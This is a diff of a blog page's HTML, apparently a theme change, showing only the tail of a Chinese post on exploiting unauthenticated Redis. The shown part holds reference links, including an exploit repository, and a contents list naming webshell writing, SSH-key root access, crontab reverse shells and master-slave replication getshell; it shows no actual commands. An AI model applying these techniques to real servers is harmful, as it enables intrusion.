 <h2 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h2><p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/">https://lorexxar.cn/2019/07/10/redis-5-x-rce/</a><br /><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">https://github.com/vulhub/vulhub/tree/master/redis/4-unacc</a><br /><a target="_blank" rel="noopener" href="https://www.cnblogs.com/websec80/articles/14734623.html">https://www.cnblogs.com/websec80/articles/14734623.html</a><br /><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a><br /><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security">https://blog.xray.cool/post/learning-redis-security</a></p>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/redis/">#redis</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Redis未授权访问初探</div>
+      <div>https://suiyideali.github.io/2023/04/20/Redis未授权访问初探/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Mochazz</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
   </div>
-</article>
 
 
 
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/" title="应急响应初探">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">应急响应初探</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/%E5%BC%80%E7%AB%AF/" title="开端">
+                        <span class="hidden-mobile">开端</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">首页</a></li>
-        
-          <li><a href="/about/">关于</a></li>
-        
-          <li><a href="/archives/">归档</a></li>
-        
-          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%E5%92%8C%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.</span> <span class="toc-text">一、简介和危害</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">1. 什么是redis未授权访问漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.2.</span> <span class="toc-text">2 漏洞危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">3. 基础命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">4. 未授权访问复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E5%88%A9%E7%94%A8redis%E5%86%99webshell"><span class="toc-number">2.2.1.</span> <span class="toc-text">4.1 利用redis写webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E5%88%A9%E7%94%A8%E2%80%9C%E5%85%AC%E7%A7%81%E9%92%A5%E2%80%9D%E8%AE%A4%E8%AF%81%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">4.2 利用“公私钥”认证获取root权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-%E5%88%A9%E7%94%A8Crontab%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.3.</span> <span class="toc-text">4.3 利用Crontab反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-%E9%80%9A%E8%BF%87%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-GetShell"><span class="toc-number">2.2.4.</span> <span class="toc-text">4.4 通过主从复制 GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-1-redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">4.4.1 redis主从复制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-2-redis%E6%A8%A1%E5%9D%97"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">4.4.2 redis模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-3-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">4.4.3 利用原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-4-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.4.4.</span> <span class="toc-text">4.4.4 复现过程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">三、参考</span></a></li></ol>
+            
+          </article>
+        </div>
       </div>
-    
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&text=Redis未授权访问初探"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&is_video=false&description=Redis未授权访问初探"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Redis未授权访问初探&body=Check out this article: https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&name=Redis未授权访问初探&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&t=Redis未授权访问初探"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
     </div>
 
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
+
+
+  </aside>
+
+
+    </div>
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2016-2023
-    Mochazz
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
 
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-    <!-- styles -->
+  </div>
+</div>
 
+    
 
+    
+  </main>
 
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
 
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
   
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
     })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-<!-- search -->
 
-<!-- Baidu Analytics -->
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
 
-<!-- Cloudflare Analytics -->
 
-<!-- Disqus Comments -->
 
-<!-- utterances Comments -->
 
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
